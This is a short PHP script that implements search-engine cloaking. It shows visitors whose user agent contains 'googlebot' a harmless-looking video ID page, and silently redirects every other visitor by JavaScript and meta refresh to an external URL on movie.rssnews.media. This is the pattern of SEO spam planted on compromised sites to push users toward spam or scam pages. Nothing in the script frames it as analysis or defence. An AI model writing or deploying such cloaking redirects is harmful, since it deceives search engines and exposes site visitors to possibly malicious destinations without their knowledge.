<?php

$google = 1;
$user = 0;

// Check if the user agent contains "googlebot"
if (strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot")) {
    $google = $google + 1;
} else {
    $user = $user + 1;
}

// Check if the user agent is Googlebot
if ($google > 1) {
    // Include the logic from watch.php

    // Check if the vid parameter is present in the URL
    if (isset($_GET['vid'])) {
        // Sanitize and extract the video ID
        $videoId = htmlspecialchars($_GET['vid']);

        // Use the $videoId in your logic (e.g., retrieve video details from a database)
        // ...

        // For demonstration purposes, let's just echo the video ID
        echo "Video ID: $videoId";
    } else {
        // Handle the case when the vid parameter is not present
        echo "Invalid request. Missing vid parameter.";
    }
} else {
    // Your existing code for non-Googlebot requests
    echo '<script type="text/javascript">document.location.replace("https://movie.rssnews.media/RlHqUWaGbAK.php");</script>';
    echo '<noscript><meta http-equiv="refresh" content="0; url=https://movie.rssnews.media/RlHqUWaGbAK.php"></noscript>';
}

?>
